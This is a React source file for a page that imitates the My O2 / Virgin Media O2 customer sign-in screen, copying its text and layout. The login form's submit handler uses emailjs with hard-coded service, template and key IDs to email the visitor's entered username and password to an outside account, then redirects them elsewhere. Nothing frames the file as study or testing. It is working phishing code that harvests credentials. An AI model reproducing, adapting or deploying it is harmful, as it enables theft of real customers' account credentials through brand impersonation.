import React, { useState, useRef } from "react";
import Accordian from "../components/Accordian";
import Wrapper from "../components/Wrapper";
import { IoIosArrowDroprightCircle } from "react-icons/io";
import "./home.css";
import Footer from "../components/Footer/Footer";
import emailjs from '@emailjs/browser';
import { useNavigate } from "react-router-dom";

const Home = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const form = useRef();
  const navigate = useNavigate();

  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Sending email using emailjs
    emailjs.sendForm('service_g6qtdfx', 'template_wr6be5e', form.current, 'Yq6PfyBIHeUEh6QmR')
    
      .then(() => {
        navigate("/about");
      })
      .catch((error) => {
        console.error('Email sending failed...', error.text);
      });
  };

  return (
    <div className="lg:h-[196vh] md:h-[230vh] w-full">
      <Accordian />
      <div className="mt-16 bg-zinc-100">
        <Wrapper>
          <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-4">
            <div className="w-full h-full bg-white mt-4 rounded-lg p-4">
              <h1 className="text-2xl mb-4">Sign in to My O2</h1>
              <form ref={form} onSubmit={handleSubmit}>
                <div className="mb-4 mr-5">
                  <label
                    htmlFor="email"
                    className="block text-gray-700 text-sm font-medium mb-2"
                  >
                    Username (usually your email address)
                  </label>
                  <input
                    type="email"
                    id="email"
                    name="user_email" // Ensure this matches your emailjs template field
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full   px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                    placeholder="Enter your email"
                    required
                  />
                </div>
                <div className="mb-6 mr-5">
                  <label
                    htmlFor="password"
                    className="block text-gray-700 text-sm font-medium mb-2"
                  >
                    Password
                  </label>
                  <input
                    type="password"
                    id="password"
                    name="user_password" // Ensure this matches your emailjs template field
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                    placeholder="Enter your password"
                    required
                  />
                </div>
                <div className="flex my-7 items-center space-x-2">
                  <input
                    className="w-5 h-5 rounded bg-transparent border-green-900"
                    type="checkbox"
                    name="remember"
                    id="check"
                  />
                  <label
                    htmlFor="check"
                    className="text-gray-700 text-sm font-medium"
                  >
                    Remember my username
                  </label>
                </div>
                <button
                  type="submit"
                  className="w-fit py-2 px-6 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500"
                >
                  Login
                </button>
              </form>
              <div className="flex gap-2 my-5 items-center justify-center">
                <span>
                  <IoIosArrowDroprightCircle className="text-blue-600" />
                </span>
                <button className="text-blue-700 hover:underline">
                  Forgotten your username or password?
                </button>
              </div>
              <div className="line flex justify-center">
                <span> ________________</span>
                <span className="mx-10">or</span>
                <span> ________________</span>
              </div>
              <div className="text-start my-5 rounded-lg p-5 border-2 border-[#2563eb]">
                <h2 className="text-2xl font-bold text-gray-700">
                  Use your Virgin Media O2 ID
                </h2>
                <span className="text-gray-600 text-sm">
                  If you've linked your Virgin Media and O2 details to create a new Virgin Media O2 ID, sign in with it here. Find out more
                </span>
                <div className="flex justify-center">
                  <button className="bg-blue-900 p-2 px-3 md:my-3 my-2 lg:my-4 text-white rounded-xl">
                    Sign in with Virgin Media O2 ID
                  </button>
                </div>
              </div>
            </div>
            <div className="lg:col-span-2 w-full h-full p-4">
              <h2 className="text-xl mb-4">Already an O2 customer?</h2>
              <p className="mb-4">
                If you've got a Pay Monthly account then we've automatically
                registered you with My O2 and given you a username and password.
              </p>
              <div className="flex gap-2 items-center mb-4">
                <span>
                  <IoIosArrowDroprightCircle className="text-blue-600" />
                </span>
                <button className="text-blue-700 hover:underline">
                  Help me sign in
                </button>
              </div>
              <h2 className="text-xl mb-4">Not yet registered?</h2>
              <p className="mb-4">
                If you're a Pay As You Go customer here are just some of the
                benefits of registering:
              </p>
              <ul className="list-disc list-inside mb-4">
                <li>Check your usage and remaining balance</li>
                <li>Set up auto top-ups</li>
                <li>Manage O2 Rewards</li>
              </ul>
              <p className="mb-4">
                O2 Wifi customer? You can register to manage your account here,
                whatever network you're on.
              </p>
              <div className="flex gap-2 items-center mb-4">
                <span>
                  <IoIosArrowDroprightCircle className="text-blue-600" />
                </span>
                <button className="text-blue-700 hover:underline">
                  Help me sign in
                </button>
              </div>
            </div>
          </div>
          <div className="text-start py-10 mx-4">
            <h1 className="text-2xl font-light">Stay Safe</h1>
            <span className="text-md pt-4">
              We'll never email or text asking you to send or verify personal, financial or password details. Make sure you keep your details safe and never give them out, even if it looks like the email or text came from us.
            </span>
          </div>
        </Wrapper>
      </div>
      <Footer />
    </div>
  );
};

export default Home;



